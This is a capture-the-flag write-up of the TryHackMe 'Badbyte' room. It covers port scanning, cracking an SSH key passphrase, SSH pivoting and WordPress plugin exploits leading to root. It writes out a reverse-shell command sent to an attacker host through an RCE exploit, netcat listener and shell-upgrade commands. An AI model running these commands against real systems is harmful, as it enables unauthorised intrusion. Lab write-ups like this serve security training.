## **Welcome everyone!**

Today, I will explain for the first time a **TryHackMe** room : **Badbyte**

Although I did more than a hundred CTF on this platform, I wasn't writing reports at that time. I discovered a lesser-known room which looked fairly easy, so let’s start from there !

![image](/THM/BadByte/BadByte_images/1.png)



## Information Gathering

First, let’s start a very basic **Nmap** scan on every 65 535 ports:

![image](/THM/BadByte/BadByte_images/2.png)



We can identify two open ports on the target host:

**SSH** (22)

**Unknown** (30024)

The second port is intriguing, let’s run an aggressive scan on these two ports with the `-A` switch:

![image](/THM/BadByte/BadByte_images/3.png)



This scan reveals a lot of useful information. We learn that the port 30024 is an  **FTP** server.

Furthermore, we learn from the Nmap Script Engine (NSE) that the Anonymous login is enabled, which means that we don’t need any credential to interact with it. It also shows us what the FTP is hosting, we can see that there are two files. 

The first file, `id_rsa`, appears to be an **SSH** **private key**. If associated with a valid user account, it could potentially grant SSH access.

 The second is a `note.txt` file, which seems interesting to investigate.
 

![image](/THM/BadByte/BadByte_images/4.png)



Questions: 

*How many ports are open?*
Answer: **3**

*What service is running on the lowest open port?*

Answer: **SSH**

*What non-standard port is open?*

Answer: **30024**

*What service is running on the non-standard port?*

Answer: **FTP**

We can then try to log in via FTP with the default credentials `anonymous : anonymous` specifying the port 30024 with the `-p` switch. Once connected, we can list the content with `ls` to confirm what we saw before:


![image](/THM/BadByte/BadByte_images/5.png)



All is in order. We can download the `id_rsa` private key to our machine with `get` and read the `note.txt` content with `less`:

![image](/THM/BadByte/BadByte_images/6.png)


We learn from the `note.txt` file that the private key we downloaded is owned by a particular user: **errorcauser** 

## Initial Access

We can now authenticate via SSH! To use the private key along the SSH login, we need to specify the private key using the `-i` switch following the file name. But before we need to change the key’s permissions with `chmod 600 id_rsa` in order to make the key usable:

![image](/THM/BadByte/BadByte_images/7.png)


It seems that the private key is protected by a passphrase… If the user configured a weak passphrase, we should be able to crack it via the **John**, a powerful tool used for offline cracking. To do this, we need to convert the file in a format that John will understand; we can convert it using `ssh2john` with the following command:

`ssh2john id_rsa > passphrase_to_crack.txt`

Then, we can pass it to John and attempt to crack it with the following command:

`john --wordlist=/usr/share/wordlists/rockyou.txt passphrase_to_crack.txt`

![image](/THM/BadByte/BadByte_images/8.png)


We successfully cracked the passphrase, which was `cupcake`, a very weak passphrase choice.

Questions:

*What username do we find during the enumeration process?*

Answer: **errorcauser**

*What is the passphrase for the RSA private key?*

Answer: **cupcake**

We can now provide it to SSH:

![image](/THM/BadByte/BadByte_images/9.png)


Here we are, we gained initial access on the target. After listing the current directory, we can identify another `note.txt` file from which we can learn the following:

![image](/THM/BadByte/BadByte_images/10.png)


There is a webserver that is only accessible via the local network of the target!

## Pivoting

Now that we have access to the machine, we can start pivoting.

We have to set up **Dynamic Port Forwarding** using SSH on our own machine with the following command:

 `ssh -i id_rsa -D 1337 errorcauser@TARGET_IP`
 

![image](/THM/BadByte/BadByte_images/11.png)



We have to let it open and add in parallel the `socks5 127.0.0.1 1337` line to our `/etc/proxychains.conf` file (to our machine). Ensure that you have commented out the `socks4 127.0.0.1 9050` line, you can reset it at the end of the room.

![image](/THM/BadByte/BadByte_images/12.png)



We can now run a port scan to enumerate internal ports on the server using `proxychains`. The command should look like this `proxychains nmap -sT 127.0.0.1` .

(For some reason, this did not work properly on my Kali machine, so I continued on the AttackBox)

![image](/THM/BadByte/BadByte_images/13.png)



In addition to the SSH port we already knew, we can identify two ports on the target’s local network:

**HTTP** (80)

**MySQL** (3306)

We found the webserver mentioned in the `note.txt` file! We can perform **Local Port Forwarding** to the port 80 using SSH with the **-L** flag. This is the command structure:

`ssh -i id_rsa -L 1234:127.0.0.1:80 errorcauser@TARGET_IP`

(the `-L` port specified depends on your choice as you will fetch it locally on your web browser, make sure that the port isn’t busy on your machine)



![image](/THM/BadByte/BadByte_images/14.png)


We successfully accessed the local webserver on our own machine via port forwarding!

We can now explore it in the case it has a particular vulnerability.

Questions:

*What main TCP ports are listening on localhost?*

Answer: **80,3306**

*What protocols are used for these ports?*

Answer: **HTTP,MySQL**

We can now perform an aggressive Nmap scan to this particular webserver that we host locally on our chosen port with the following command (in my case it will be the port 1234):


![image](/THM/BadByte/BadByte_images/15.png)


We can identify that the webserver is running WordPress! Moreover, we identified the CMS version which is **5.3.2 .**

Since we’re dealing with WordPress, we can use `wpscan`, a powerful tool designed for WordPress used to perform an in-depth enumeration. We can try to locate vulnerable plugins with the following command:

`wpscan --url http://127.0.0.1:1234 -e ap --plugins-detection aggressive --no-update`

![image](/THM/BadByte/BadByte_images/16.png)



We can identify three plugins. Two of them seems to be outdated: **duplicator** (1.4.0) and **wp-file-manager** (7.1). So let’s use `searchsploit`, an offline exploits collection linked to [Exploit-DB](https://www.exploit-db.com/). Let’s start with the duplicator plugin:


![image](/THM/BadByte/BadByte_images/17.png)


As we can see, there are multiple exploits but none is matching with our current version. We can try the “**Duplicator 1.3.26 - Unauthenticated Abritrary File Read**” exploit (CVE-2020-11738), which closely matches our version. We can try this:

![image](/THM/BadByte/BadByte_images/18.png)


We should specify the target URL which corresponds to the WordPress website in addition to the remote file we want to read. In this case, the URL will be `http://127.0.0.1:1234` but remember that the port depends to your initial choice during the Local Port Forwarding configuration phase.

![image](/THM/BadByte/BadByte_images/19.png)



We successfully exploited the vulnerability! This exploit allows us to read arbitrary files on the target.

But there is a remaining potential vulnerable plugin that we didn’t inspect yet: **wp-file-manager**. We will again use searchsploit and check for any exploit related to this plugin which could give us a remote access to the target:


![image](/THM/BadByte/BadByte_images/20.png)



There is one exploit (CVE-2020-25213) affecting versions close to the one used by the target. We will copy it to our current directory and execute it:


![image](/THM/BadByte/BadByte_images/21.png)



It seems to allow us to perform an RCE against the target!

Again, we need to provide the target URL. But this time, we need to provide the command we want to execute to the system. We can attempt to obtain a reverse shell from this vulnerability. Let’s execute a **Bash** command that will try to connect to a listener we will configure. Let’s set up a listener with the following command:

`nc -lvnp 4444` 

In parallel, we can run the following command with the python script we obtained:

`python3 51224.py http://127.0.0.1:1234 "busybox nc <YOUR_IP> <NC_PORT> -e sh"`



![image](/THM/BadByte/BadByte_images/22.png)



After executing the exploit, our **netcat listener** recieves a shell! As we do not have any prompt for the returned shell, we can upgrade it using the following command: 

`python3 -c 'import pty; pty.spawn("/bin/bash")'`



![image](/THM/BadByte/BadByte_images/23.png)



(I forgot to show it above but execute `export TERM=xterm` to make the clear command functional after shell upgrading)

We now have a stabilized shell and logged in as the user **cth**.

Question:

*What CMS is running on the machine?*
Answer: **WordPress**

*What is the CVE number for directory traversal vulnerability?*
Answer: **CVE-2020-11738**

*What is the CVE number for remote code execution vulnerability?*
Answer: **CVE-2020-25213**

*What is the name of user that was running CMS?*

Answer: **cth**

listing the `/home` directory shows us that the **cth** user has a home directory, so let’s inspect it:



![image](/THM/BadByte/BadByte_images/24.png)



we successfully retrieve the `user.txt` flag !

## Privilege Escalation

After gaining access as the second user, we now want to enumerate our current privileges. The `sudo -l` command is the first thing we run in such a case, as we want to know what the particular user we compromised can do, if he can run particular command via sudo with root privileges. 



![image](/THM/BadByte/BadByte_images/25.png)



But we need to provide a password. Maybe after an in-depth enumeration of the system we would be able to retrieve it stored somewhere?

An alternative of the `.bash_history file` (here redirected to `/dev/null`) `bash.log` in the Linux directories that contains log (`/var/log`). Let’s take a look:






![image](/THM/BadByte/BadByte_images/26.png)



![image](/THM/BadByte/BadByte_images/27.png)




It looks like we found a previous session owned by the **cth** user! We can learn that the user changed his password, which led us to answer to the following question:

*What is the user’s old password?*

Answer: **G00dP@$sw0rd2020**

Attempting to run `sudo -l` with this doesn’t work, because the user changed it. However, we learn from the room author that :

*Sometimes the user may reuse the same password or they slightly change their password after a data breach. For example they may change it from "Goodpassword2019" to "Goodpassword2020" or from "Autumn20!" to "Spring20!".*

This suggests that the user only slightly modified their password. We can try `G00dP@$sw0rd2021` for example, increasing “2020” of 1:



![image](/THM/BadByte/BadByte_images/28.png)



And it looks like we successfully ran the command! As we can see, we can execute any command on the system as **root** without providing any password. We can run `sudo /bin/bash` to spawn a `bash` shell as the **root** user, giving us full privileges:


![image](/THM/BadByte/BadByte_images/29.png)



And we’re root! We can now access the final flag in the `/root` directory.

![image](/THM/BadByte/BadByte_images/30.png)



## Conclusion

 

This room was very interesting because it introduced several important concepts such as internal service enumeration, SSH port forwarding, WordPress exploitation, and privilege escalation through password reuse.

After gaining initial access through an exposed SSH private key, we pivoted to an internal web application hosted locally on the target. We then exploited a vulnerable WordPress plugin to achieve remote code execution and gain access as the `cth` user.

Finally, we enumerated the system to recover an old password from log files and successfully guessed the updated version of the password, allowing us to escalate privileges to root via `sudo`.

Thank you for reading!
